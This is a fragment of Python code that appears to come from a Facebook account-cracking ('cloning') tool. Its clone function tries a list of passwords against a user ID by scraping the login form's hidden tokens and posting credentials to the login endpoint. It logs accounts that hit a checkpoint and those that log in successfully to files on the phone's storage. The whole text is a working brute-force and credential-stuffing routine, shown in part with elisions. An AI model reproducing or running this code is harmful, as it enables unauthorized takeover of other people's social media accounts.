...
def clone(id,pw,limit):
	...
	for pas in pw:
		...
		try:
			...
			dat = {"lsd":JAI('name="lsd" value="(.*?)"', str(ro)).group(1),"jazoest":JAI('name="jazoest" value="(.*?)"', str(ro)).group(1),"m_ts":JAI('name="m_ts" value="(.*?)"', str(ro)).group(1),"li":JAI('name="li" value="(.*?)"', str(ro)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":pas,"login":"Log In"}
			r = requests.post(url,data=dat,headers=hed)
			if "checkpoint" in r.text:
				print(f"{r}[CP] {id} | {pas}{s}")
				cp.append(id)
				open("/sdcard/TONU_cp.txt",'a').write(id+' - '+pas)
				break
			elif 'c_user' in r.text:
				print(f"{g}[CP] {id} | {pas}{s}")
				ok.append(id)
				open("/sdcard/TONU_ok.txt",'a').write(id+' - '+pas)
				break
			else:
				pass
		except:
